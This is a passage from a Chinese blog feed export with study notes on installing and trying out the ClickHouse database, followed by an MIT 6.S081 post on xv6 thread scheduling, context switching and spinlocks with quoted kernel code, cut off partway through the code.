    <content><![CDATA[<h2 id="MIT-6-S081-lab10-network"><a href="#MIT-6-S081-lab10-network" class="headerlink" title="MIT 6.S081 lab10 network"></a>MIT 6.S081 lab10 network</h2><p>前三题确实都是常规题目，第四题出的不是很好。</p>
<h4 id="lab9-mmap"><a href="#lab9-mmap" class="headerlink" title="lab9 mmap"></a>lab9 mmap</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT 6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【clickhouse】 clickhouse学习记录(一)</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/52/</url>
    <content><![CDATA[<h1 id="clickhouse学习记录（一）"><a href="#clickhouse学习记录（一）" class="headerlink" title="clickhouse学习记录（一）"></a>clickhouse学习记录（一）</h1><p>最近因为工作原因,开始尝试学习<code>clickhouse</code>数据库, 将会逐渐将<code>clickhouse</code>的一些学习总结记录下来, 作为自己的学习历程.</p>
<h2 id="clickhouse的简介"><a href="#clickhouse的简介" class="headerlink" title="clickhouse的简介"></a>clickhouse的简介</h2><p><strong>项目起源</strong><br><code>clickhouse</code>是由俄罗斯的一家互联网公司 <code>Yandex</code> 开发的,  <code>Yandex</code> 主要从事互联网分析，<code>Yandex</code> 使用 <code>clickhouse</code> 从事海量的互联网的流量分析，<code>clickhouse</code> 作为 <code>Yandex</code> 公司内部使用的项目, 后来走向开源． <code>clickhouse</code> 作为 <code>OLAP</code> 领域的流行, 主要得益于其出色的性能.<br>数据库领域有两个概念:</p>
<ul>
<li><p><code>OLTP</code>: on-line transaction processing翻译为联机事务处理, <code>OLTP</code>是主要从事事务处理, 包括数据库常见的增删改.<code>OLTP</code>主要用来记录某类业务事件的发生，如购买行为，当行为产生后，系统会记录是谁在何时何地做了何事，这样的一行（或多行）数据会以增删改的方式在数据库中进行数据的更新处理操作，要求实时性高、稳定性强、确保数据及时更新成功，像公司常见的业务系统如<code>ERP</code>，<code>CRM</code>，<code>OA</code>等系统都属于<code>OLTP</code>.</p>
</li>
<li><p><code>OLAP</code>: On-Line Analytical Processing翻译为联机分析处理, <code>OLAP</code>是主要侧重于数据分析和查询, 主要侧重的功能是数据库的查询.当数据积累到一定的程度，我们需要对过去发生的事情做一个总结分析时，就需要把过去一段时间内产生的数据拿出来进行统计分析，从中获取我们想要的信息，为公司做决策提供支持，这时候就是在做<code>OLAP</code>了。</p>
</li>
<li><p>数据仓库: 因为<code>OLTP</code>所产生的业务数据分散在不同的业务系统中，而<code>OLAP</code>往往需要将不同的业务数据集中到一起进行统一综合的分析，这时候就需要根据业务分析需求做对应的数据清洗后存储在数据仓库中，然后由数据仓库来统一提供<code>OLAP</code>分析。所以我们常说<code>OLTP</code>是数据库的应用，<code>OLAP</code>是数据仓库的应用。<br>详细可以参考知乎的<a href="https://www.zhihu.com/question/24110442/answer/851671343">回答</a></p>
</li>
</ul>
<p><strong>clickhouse的特性</strong><br><code>clickhouse</code> 采用列式存储, 所有的数据都是以列为单位进行组织和存储的, <code>clickhouse</code>的最大的特色就是以性能著称, 官方的文档也给出了相关的<a href="https://clickhouse.com/benchmark/dbms/">性能对比</a>.<code>clickhouse</code>的特性:</p>
<ul>
<li>以列为存储, 同一列的数据格式统一, 方便使用数据压缩算法. 目前<code>clickhouse</code> 使用的<code>LZ4</code> 压缩算法. 数据压缩可以带来两个好处, 数据存储的空间较小从而读写磁盘花费时间较短, 网络传输中也会较少缓存时间.</li>
<li><code>ClickHouse</code>允许在运行时创建表和数据库、加载数据和运行查询，而无需重新配置或重启服务。具有完成的数据库管理系统的功能.</li>
<li>多核心并行处理, 充分利用<code>CPU</code>的资源, 设计时针对具体的硬件进行充分优化, 从而提升性能. 看到字符串搜索中竟然用到了<code>intel hyperscan</code>, 这个是<code>dpi</code>设备里面常用的字符串搜索算法. 支持<code>CPU</code> 的<code>SIMD</code>指令, 可以向量执行数据的处理和读取.</li>
<li>支持多服务器分布式处理, 支持分布式查询, 可以进行负载均衡.</li>
<li>实时的数据更新, 为了使查询能够快速在主键中进行范围查找，数据总是以增量的方式有序的存储在<code>MergeTree</code>中。因此，数据可以持续不断地高效的写入到表中，并且写入的过程中不会存在任何加锁的行为。</li>
<li><code>click house</code>中的很多优化技巧都值得仔细学习和琢磨.</li>
</ul>
<h3 id="clickhouse的不足之处"><a href="#clickhouse的不足之处" class="headerlink" title="clickhouse的不足之处"></a>clickhouse的不足之处</h3><p><code>clickhouse</code> 主要用于数据分析, 也有许多缺点.</p>
<ul>
<li>不支持事务<code>ACID</code>。</li>
<li>缺少高频率，低延迟的修改或删除已存在数据的能力,以行进行更新数据的话性能较差.。</li>
<li>稀疏索引使得<code>ClickHouse</code>不适合通过其键检索单行的点查询。</li>
</ul>
<h3 id="clickhouse的发展现状"><a href="#clickhouse的发展现状" class="headerlink" title="clickhouse的发展现状"></a>clickhouse的发展现状</h3><p><code>click</code> 以其出色的性能, 目前在很多很多<code>BI</code>领域得到应用, 还有许多广告流量，<code>web</code>分析, 电子商务等领域. 以下为常见的几个学习的资源库:</p>
<ul>
<li><code>clickhouse</code>文档: <a href="https://clickhouse.com/docs/zh/">https://clickhouse.com/docs/zh/</a></li>
<li><code>clickhouse</code>repo: <a href="https://github.com/ClickHouse/ClickHouse">https://github.com/ClickHouse/ClickHouse</a></li>
<li><code>clickhouse</code>中文社区: <a href="http://www.clickhouse.com.cn/">http://www.clickhouse.com.cn/</a></li>
<li><code>clickhouse</code>官方:<a href="https://clickhouse.com/">https://clickhouse.com/</a></li>
</ul>
<h2 id="clickhouse的安装部署"><a href="#clickhouse的安装部署" class="headerlink" title="clickhouse的安装部署"></a>clickhouse的安装部署</h2><ul>
<li><p><code>server</code>安装:官方提供的<code>guide</code>有许多种安装方式, 强烈推荐使用<code>apt-get</code>或者<code>yum</code>这种标准安装包的形式来安装,会自动更新和下载各种库, 自己可以下载源码,然后编译到本地进行安装, 机器性能太差, 编译实践太长, 中间容易经历各种坑,新手强烈不推荐. 安装过程踩过的坑是, 直接下载官方提供的编译好的库和程序, <code>windows</code>自带的<code>wsl</code>安装后反正各种莫名奇妙的问题，各种莫名奇妙的<code>abort</code>退出, 也找不到问题原因所在, 反而远程的<code>VPS</code>安装一次就顺利.</p>
</li>
<li><p><code>config</code> 文件说明: 默认的<code>config</code> 文件会存放在<code>/etc/clickhouse-server/config.xml</code>目录下, 安装完成之后需要进行修改, 当然默认的<code>clickhouse server</code> 只监听在本地<code>127.0.0.1</code>, 需要进行修改使得它可以接受所有外部的主机发起的<code>tcp</code>请求. 高级的配置文件参数定义可以参考官方的文档:<a href="https://clickhouse.com/docs/zh/operations/configuration-files/">配置文件</a>. </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--允许所有的ipv6的请求--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listen_host</span>&gt;</span>::<span class="tag">&lt;/<span class="name">listen_host</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--允许所有的ipv4的请求--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listen_host</span>&gt;</span>0.0.0.0<span class="tag">&lt;/<span class="name">listen_host</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>server</code>启动与测试: 直接执行<code>clickhouse-server</code>时, 会提示要求创建<code>clickhouse:clickhouse</code>账户, 建议直接使用脚本启动服务，<code>root</code>账户启动即可，需要修改配置文件，默认要求使用<code>clickhouse</code>的用户名.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo service clickhouse-server start</span><br></pre></td></tr></table></figure>
<p>查看进程：<br><img src="https://s2.loli.net/2022/01/18/iqTxDBH9Jw4okfU.png"><br>查看端口：<br><img src="https://s2.loli.net/2022/01/18/Zq2fsLAWYcuOQiH.png"></p>
</li>
<li><p><code>vps firewall</code>设置: 直接将<code>centos</code>的防火墙关掉, 由于是远程<code>VPS</code>需要设置端口号, 允许<code>clickhouse</code>服务通行:<br><img src="https://s2.loli.net/2022/01/18/IvoVqjZEpU69GMC.png"></p>
</li>
</ul>
<h2 id="clickhouse的使用测试"><a href="#clickhouse的使用测试" class="headerlink" title="clickhouse的使用测试"></a>clickhouse的使用测试</h2><p>我们可以通过<code>clickhouse</code>自带的<code>clickhouse-client</code>程序来本地或者远程访问<code>clickhouse server</code>, 尝试以下数据库的基本操作:</p>
<ul>
<li>连接数据库<code>server</code>: <code>clickhouse-client</code>默认就会连接本地的<code>clickhouse</code>的数据库<code>server</code>, 我们尝试连接远程的<code>vps</code>, <code>clickhouse-client --host=x.x.x.x</code>即可连接指定<code>ip</code>的数据库。<code>clickhouse-client --query=&#39;xx&#39;</code>即可执行<code>query</code>中<code>sql</code>语句.</li>
<li>创建数据库: 创建<code>test</code>数据库, <code>clickhouse-client --query=&#39;CREATE DATABASE IF NOT EXISTS test&#39;</code>.</li>
<li>创建表项: 创建<code>numbers</code>表项, <code>clickhouse-client --query=&#39;CREATE TABLE IF NOT EXISTS test.numbers (id UInt64, name String) ENGINE = Memory&#39;</code>.</li>
<li>插入表项: 插入<code>numbers</code>行, <code>clickhouse-client --query=&#39;INSERT INTO test.numbers VALUES (100, &#39;mengmingliang&#39;)&#39;</code>.</li>
<li>删除表项: 删除<code>numbers</code>行, <code>clickhouse-client --query=&#39;INSERT INTO test.numbers VALUES (100, &#39;mengmingliang&#39;)&#39;</code>.</li>
<li>查询表项: 查询基本的表，<code>clickhouse-client --query=&#39;SELECT id, name FROM test.numbers&#39;</code>;</li>
<li>删除数据表项: 删除<code>numbers</code>表, <code>DROP TABLE test.numbers</code>.</li>
</ul>
<h2 id="clickhouse-client的连接接口测试"><a href="#clickhouse-client的连接接口测试" class="headerlink" title="clickhouse client的连接接口测试"></a>clickhouse client的连接接口测试</h2><p><code>clickhouse</code>提供了多种通用的接口用来连接和操作数据, 提供了<code>http</code>和<code>tcp</code>的两种访问接口形式，<code>http</code>的访问端口为<code>8123</code>, <code>tcp</code>的端口为<code>9000</code>, 我们可以在浏览器中输入<code>http://localhost:8123</code>就会打印出<code>ok</code>, 浏览器中输入<code>http://localhost:8123/?query=SELECT%201</code>就会返回查询结果. <code>http</code>的接口主要用于<code>Java</code>的开发,我们可以使用标准的<code>jdbc</code>来访问数据库, HTTP接口比原生接口受到更多的限制，但它具有更好的兼容性.<code>tcp</code>端口主要用于服务器间的通讯查询和管理，同时也支持数据库的查询，比<code>http</code>的接口会更加灵活使用, 官方目前只提供了标准的<code>C++</code>接口, 这种接口目前没有标准, 但是我能想到的是很容易对这些接口来进行扩展, 从而来对<code>clickhouse</code>增加新的功能和特性,这点确实不错, 为程序的灵活性做了更多的扩展.</p>
<ul>
<li>通过<code>C++</code>接口测试: 我们可以下载官方提供的标准的<code>C++</code>的接口<a href="https://github.com/ClickHouse/clickhouse-cpp">CPP</a>, 下载之后进行编译, 需要注意的是由于<code>clickhouse</code>是用<code>C++17</code>的标准编写的, 需要升级本地的<code>gcc</code>程序支持<code>C++ 17</code>.编译完成之后发现支持静态链接库, 手动写个简单<code>makefile</code>, 测试跑了一遍, 还算比较正常. 下一步需要走读和分析一下<code>clinet</code>的代码, 熟悉一下原理, 尝试一下后面是否有扩展的可能性, 示例代码放在<a href="https://github.com/mike-box/datdabasestudy/tree/main/clickhouse/proj">github</a>.</li>
<li>通过<code>Python</code>接口测试: <code>python</code>的接口不是官方团队提供是, 是由第三方提供的代码, 目前尝试了一下<code>clickhouse-driver</code>这个第三方的库, 很多功能都没有深入尝试, 后面有时间时需要进行深入的探索.</li>
<li>通过<code>DBeaver</code>接口测试: 下载尝试了一下通过可户端去连接<code>clickhouse</code>, 用<code>Gui</code>的客户端确实方便很多, 可以通过标准的<code>jdbc</code>接口去连接数据库, 需要下载<code>clickhouse</code>的驱动,我们可以很方便的访问数据库.可以直接执行标准的<code>sql</code>语句. 可以直接通过接口导入和导出数据, 确实比用纯粹的程序实现要方便许多.<br><img src="https://s2.loli.net/2022/01/18/hjsSX97RMxn6tHK.png"></li>
</ul>
<h2 id="clickhouse-client的高级特性尝试"><a href="#clickhouse-client的高级特性尝试" class="headerlink" title="clickhouse client的高级特性尝试"></a>clickhouse client的高级特性尝试</h2><ol>
<li>创建数据库: <code>CREATE DATABASE IF NOT EXISTS db_name [ENGINE = engine]</code><ul>
<li><code>Ordinary</code>：默认引擎，在绝大多数情况下我们都会使用默认引擎，使用时无须刻意声明。在此数据库下可以使用任意类型的表引擎。</li>
<li><code>Dictionary</code>：字典引擎，此类数据库会自动为所有数据字典创建它们的数据表，关于数据字典的详细介绍会在第5章展开。</li>
<li><code>Memory</code>：内存引擎，用于存放临时数据。此类数据库下的数据表只会停留在内存中，不会涉及任何磁盘操作，当服务重启后数据会被清除。</li>
<li><code>Lazy</code>：日志引擎，此类数据库下只能使用<code>Log</code>系列的表引擎，关于<code>Log</code>表引擎的详细介绍会在第8章展开。</li>
<li><code>MySQL</code>：<code>MySQL</code>引擎，此类数据库下会自动拉取远端<code>MySQL</code>中的数据，并为它们创建<code>MySQL</code>表引擎的数据表</li>
</ul>
</li>
</ol>
<h2 id="进一步打算"><a href="#进一步打算" class="headerlink" title="进一步打算"></a>进一步打算</h2><ul>
<li><ol>
<li>学习<code>SQL</code>的高级语法基础知识以及数据库的高级一些理论知识，进行理论基础知识补充。</li>
</ol>
</li>
<li><ol start="2">
<li><code>clickhouse</code>中文社区中找一些经典的入门资料进行学习，学习相关书籍<a href="https://read.douban.com/reader/ebook/149635956/">clickhouse原理解析与应用实践</a>。</li>
</ol>
</li>
<li><ol start="3">
<li>熟悉和掌握实际业务中常用的<code>clickhouse</code>的高级特性和功能，并掌握背后的相关原理。</li>
</ol>
</li>
<li><ol start="4">
<li>相关业务知识和语言技能的掌握，熟悉相关的<code>JAVA/C++</code> 关于操作数据库的接口<code>api</code>函数的使用。</li>
</ol>
</li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mike-box.github.io/">http://mike-box.github.io/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】 lab7 thread</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/58/</url>
    <content><![CDATA[<h1 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h1><p>感觉<code>thread lab</code>是我做的基本上最简单的<code>lab</code>了，但是感觉这个章节是干货最多的章节，很多操作系统的原理和技术实现细节就一下子全部很清晰．再配合<code>lab</code>完成现程的实现,感觉对操作系统的进程调度有了一个非常清晰的认识,是非常值得仔细学习和思考的章节.</p>
<ul>
<li><p>时间片调度的本质: CPU内部有定时器,定时器会定期的发起中断.操作系统内核接收到了定时器中断后，通过<code>context</code>切换,从当前进程的内核线程切换内核的进程调度程序，而在调度程序内部会实现对进程的调度．我们仔细分析一下源代码可以知道,进程调度工作的流程．</p>
</li>
<li><p>在所有的进程中顺序查找到下一个处在就绪态的进程,然后通过切换上下文将该进程的内核线程切换到<code>CPU</code>中,而该内核线程又通过<code>trapret</code>，<code>cpu</code>恢复到该进程的用户线程.如果当前进程接受到中断时,就会进入<code>usertrap</code>中,在<code>usertrap</code>中检测如果当前为定时器中断,则进行上下文切换切换到内核中的线程调度程序．实际的进程调度分为两种方式，一种方式是时间片到了，当前的进程被动放弃<code>CPU</code>,另一种方式是当前的进程可能需要等待挂起,主动的放弃<code>CPU</code>.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrap</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((<span class="built_in">r_sstatus</span>() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  <span class="built_in">w_stvec</span>((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = <span class="built_in">r_sepc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">r_scause</span>() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    <span class="built_in">intr_on</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">syscall</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = <span class="built_in">devintr</span>()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, <span class="built_in">r_scause</span>(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, <span class="built_in">r_sepc</span>(), <span class="built_in">r_stval</span>());</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">yield</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">usertrapret</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// Avoid deadlock by ensuring that devices can interrupt.</span></span><br><span class="line">    <span class="built_in">intr_on</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> nproc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      <span class="built_in">acquire</span>(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state != UNUSED) &#123;</span><br><span class="line">        nproc++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == RUNNABLE) &#123;</span><br><span class="line">        <span class="comment">// Switch to chosen process.  It is the process&#x27;s job</span></span><br><span class="line">        <span class="comment">// to release its lock and then reacquire it</span></span><br><span class="line">        <span class="comment">// before jumping back to us.</span></span><br><span class="line">        p-&gt;state = RUNNING;</span><br><span class="line">        c-&gt;proc = p;</span><br><span class="line">        <span class="built_in">swtch</span>(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process is done running for now.</span></span><br><span class="line">        <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">        c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nproc &lt;= <span class="number">2</span>) &#123;   <span class="comment">// only init and sh exist</span></span><br><span class="line">      <span class="built_in">intr_on</span>();</span><br><span class="line">      <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;wfi&quot;</span>)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>进程调度的实现原理: 在<code>xv6</code>系统中,进程调度直接顺序查找即可,当然找到下一个线程需要$O(n)$的时间复杂度,在实际的<code>Linux</code>系统中,线程都带有优先级,在做线程切换时,可以利用堆的特性,在 $O(\lg n)$ 的时间复杂度内即可将优先级最高的线程且处于就绪态的线程找出来.</p>
</li>
<li><p>上下文切换的本质: 本质即为切换寄存器的值.将程序运行过程中的<code>ra</code>以及<code>sp</code>以及几个常用的由<code>callee</code>保存的寄存器进行保存相关的值即可.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.globl swtch</span><br><span class="line">swtch:</span><br><span class="line">        sd ra, <span class="number">0</span>(a0)</span><br><span class="line">        sd sp, <span class="number">8</span>(a0)</span><br><span class="line">        sd s0, <span class="number">16</span>(a0)</span><br><span class="line">        sd s1, <span class="number">24</span>(a0)</span><br><span class="line">        sd s2, <span class="number">32</span>(a0)</span><br><span class="line">        sd s3, <span class="number">40</span>(a0)</span><br><span class="line">        sd s4, <span class="number">48</span>(a0)</span><br><span class="line">        sd s5, <span class="number">56</span>(a0)</span><br><span class="line">        sd s6, <span class="number">64</span>(a0)</span><br><span class="line">        sd s7, <span class="number">72</span>(a0)</span><br><span class="line">        sd s8, <span class="number">80</span>(a0)</span><br><span class="line">        sd s9, <span class="number">88</span>(a0)</span><br><span class="line">        sd s10, <span class="number">96</span>(a0)</span><br><span class="line">        sd s11, <span class="number">104</span>(a0)</span><br><span class="line"></span><br><span class="line">        ld ra, <span class="number">0</span>(a1)</span><br><span class="line">        ld sp, <span class="number">8</span>(a1)</span><br><span class="line">        ld s0, <span class="number">16</span>(a1)</span><br><span class="line">        ld s1, <span class="number">24</span>(a1)</span><br><span class="line">        ld s2, <span class="number">32</span>(a1)</span><br><span class="line">        ld s3, <span class="number">40</span>(a1)</span><br><span class="line">        ld s4, <span class="number">48</span>(a1)</span><br><span class="line">        ld s5, <span class="number">56</span>(a1)</span><br><span class="line">        ld s6, <span class="number">64</span>(a1)</span><br><span class="line">        ld s7, <span class="number">72</span>(a1)</span><br><span class="line">        ld s8, <span class="number">80</span>(a1)</span><br><span class="line">        ld s9, <span class="number">88</span>(a1)</span><br><span class="line">        ld s10, <span class="number">96</span>(a1)</span><br><span class="line">        ld s11, <span class="number">104</span>(a1)</span><br><span class="line">        </span><br><span class="line">        ret</span><br></pre></td></tr></table></figure></li>
<li><p>本章还讲述了<code>spin lock</code>的实现原理,感觉非常清晰明了.首先我们需要知道<code>CPU</code>支持的原子操作,一般使用编译器自带的几个通用的原子操作如下，具体可以参考<code>gcc</code>的文档:<a href="https://gcc.gnu.org/onlinedocs/gcc-4.1.2/gcc/Atomic-Builtins.html">Gcc手册中《Using the GNU Compiler Collection (GCC)》</a>.</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">type __sync_fetch_and_add (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将value加到*ptr上，结果更新到*ptr，并返回操作之前*ptr的值</span></span><br><span class="line">type __sync_fetch_and_sub (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 从*ptr减去value，结果更新到*ptr，并返回操作之前*ptr的值</span></span><br><span class="line">type __sync_fetch_and_or (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将*ptr与value相或，结果更新到*ptr， 并返回操作之前*ptr的值</span></span><br><span class="line">type __sync_fetch_and_and (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将*ptr与value相与，结果更新到*ptr，并返回操作之前*ptr的值</span></span><br><span class="line">type __sync_fetch_and_xor (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将*ptr与value异或，结果更新到*ptr，并返回操作之前*ptr的值</span></span><br><span class="line">type __sync_fetch_and_nand (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将*ptr取反后，与value相与，结果更新到*ptr，并返回操作之前*ptr的值</span></span><br><span class="line">type __sync_add_and_fetch (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将value加到*ptr上，结果更新到*ptr，并返回操作之后新*ptr的值</span></span><br><span class="line">type __sync_sub_and_fetch (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 从*ptr减去value，结果更新到*ptr，并返回操作之后新*ptr的值</span></span><br><span class="line">type __sync_or_and_fetch (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将*ptr与value相或， 结果更新到*ptr，并返回操作之后新*ptr的值</span></span><br><span class="line">type __sync_and_and_fetch (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将*ptr与value相与，结果更新到*ptr，并返回操作之后新*ptr的值</span></span><br><span class="line">type __sync_xor_and_fetch (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将*ptr与value异或，结果更新到*ptr，并返回操作之后新*ptr的值</span></span><br><span class="line">type __sync_nand_and_fetch (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将*ptr取反后，与value相与，结果更新到*ptr，并返回操作之后新*ptr的值</span></span><br><span class="line"><span class="type">bool</span> __sync_bool_compare_and_swap (type *ptr, type oldval type newval, ...)</span><br><span class="line"><span class="comment">// 比较*ptr与oldval的值，如果两者相等，则将newval更新到*ptr并返回true</span></span><br><span class="line">type __sync_val_compare_and_swap (type *ptr, type oldval type newval, ...)</span><br><span class="line"><span class="comment">// 比较*ptr与oldval的值，如果两者相等，则将newval更新到*ptr并返回操作之前*ptr的值</span></span><br><span class="line">__sync_synchronize (...)</span><br><span class="line"><span class="comment">// 发出完整内存栅栏</span></span><br><span class="line">type __sync_lock_test_and_set (type *ptr, type value, ...)</span><br><span class="line"><span class="comment">// 将value写入*ptr，对*ptr加锁，并返回操作之前*ptr的值。即，try spinlock语义</span></span><br><span class="line"><span class="type">void</span> __sync_lock_release (type *ptr, ...)</span><br><span class="line"><span class="comment">// 将0写入到*ptr，并对*ptr解锁。即，unlock spinlock语义</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>典型的<code>spin lock</code>的实现，仔细分析一下源代码：</p>
</li>
<li><ul>
<li><code>acquire</code>期间会关闭中断,这是为了防止死锁.并同时将计数加<code>1</code>.<code>release</code>时,将计数减<code>1</code>,同时会恢复中断.</li>
</ul>
</li>
<li><ul>
<li>我们会一直等待<code>lk-&gt;locked</code>变为<code>0</code>,如果<code>lk-&gt;locked</code>为<code>1</code>则会一直等待,<code>lk-&gt;locked</code>为<code>0</code>,则我们会继续进程到下一步.</li>
</ul>
</li>
<li><ul>
<li>从自旋锁的实现方式上来看,我们可以看到自旋锁的资源的消耗还是非常大的,这就需要我们谨慎的使用锁.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Acquire the lock.</span></span><br><span class="line"><span class="comment">// Loops (spins) until the lock is acquired.</span></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">acquire</span><span class="params">(<span class="keyword">struct</span> spinlock *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">push_off</span>(); <span class="comment">// disable interrupts to avoid deadlock.</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">holding</span>(lk))</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;acquire&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// On RISC-V, sync_lock_test_and_set turns into an atomic swap:</span></span><br><span class="line">  <span class="comment">//   a5 = 1</span></span><br><span class="line">  <span class="comment">//   s1 = &amp;lk-&gt;locked</span></span><br><span class="line">  <span class="comment">//   amoswap.w.aq a5, a5, (s1)</span></span><br><span class="line">  <span class="keyword">while</span>(__sync_lock_test_and_set(&amp;lk-&gt;locked, <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tell the C compiler and the processor to not move loads or stores</span></span><br><span class="line">  <span class="comment">// past this point, to ensure that the critical section&#x27;s 